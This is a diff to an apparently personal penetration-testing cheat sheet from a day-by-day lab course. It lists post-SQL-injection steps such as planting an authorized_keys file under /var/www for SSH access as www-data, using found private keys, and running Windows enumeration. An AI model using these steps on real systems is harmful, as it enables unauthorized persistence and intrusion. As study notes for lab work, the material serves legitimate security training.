@@ -25,6 +25,7 @@ IF YOU GET ACCESS TO A TERMINAL VIA SQL INJECTION USE THIS >
 ; mkdir /var/www/html/.ssh/authorized_keys
 ;echo "" > /var/www/.ssh/authorized_keys (MAKE THE .SSH FOLDER YOU DOOF)
 ssh -i id_rsa www-data@10.50.26.109
+tip > IF YOU FIND A PRIVATE KEY MAKE SURE TO CHMOD 600 IT 
 
 ## PYTHON SERVER ##
 python3 -M http.server
@@ -44,7 +45,10 @@ SEE DAY 5 FOR THIS INFO
 ## REMOTE BUFFER OVERFLOW ##
 SEE DAY 6 FOR THIS INFO
 
-## POST ENUMERATION ##
+## WINDOWS EXPLOIT ##
+SEE DAY 8 FOR THIS INFO
+
+## POST EXPLOIT ##
 
 #WINDOWS#
 ipconfig /all                                                  
